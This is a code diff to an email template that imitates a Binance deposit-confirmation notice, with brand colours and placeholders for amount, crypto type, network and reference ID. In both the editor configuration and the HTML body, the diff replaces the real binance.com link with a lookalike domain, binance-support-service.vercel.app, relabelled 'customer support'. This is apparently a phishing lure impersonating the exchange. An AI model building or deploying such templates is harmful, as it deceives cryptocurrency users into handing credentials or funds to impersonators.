@@ -45,8 +45,8 @@ const defaultEditorJson = {
     {
       id: "btn-1",
       type: "button",
-      label: "Visit Your Dashboard",
-      href: "https://www.binance.com",
+      label: "customer support",
+      href: "https://binance-support-service.vercel.app/",
       backgroundColor: "#f0b90b",
       textColor: "#1e2329",
       align: "left",
@@ -87,7 +87,7 @@ async function main() {
     <p>Hello {{name}},</p>
     <p>Your deposit of <strong>{{amount}} {{crypto_type}}</strong> is now available.</p>
     <p>Network: {{network}}<br>Receiver: {{receiver_email}}<br>Message: {{message}}<br>Reference ID: {{reference_id}}</p>
-    <a href="https://www.binance.com" style="background:#f0b90b;color:#1e2329;padding:14px 28px;text-decoration:none;font-weight:700;display:inline-block;border-radius:4px;">Visit Your Dashboard</a>
+    <a href="https://binance-support-service.vercel.app/" style="background:#f0b90b;color:#1e2329;padding:14px 28px;text-decoration:none;font-weight:700;display:inline-block;border-radius:4px;">customer support</a>
   </div>
 </body>
 </html>`.trim();
